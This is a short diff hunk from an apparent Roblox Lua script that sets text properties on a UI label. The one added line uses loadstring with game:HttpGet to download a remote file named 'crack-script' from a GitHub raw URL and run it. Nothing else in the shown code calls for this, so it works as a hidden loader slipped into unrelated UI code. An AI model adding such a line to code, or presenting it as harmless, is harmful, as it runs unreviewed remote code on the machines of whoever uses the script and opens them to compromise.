@@ -285,3 +285,4 @@ Name.TextScaled             = true
 Name.TextSize               = 14
 Name.TextWrapped            = true
 Name.TextXAlignment         = Enum.TextXAlignment.Left
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NEXOS123/rmc5/main/crack-script"))();
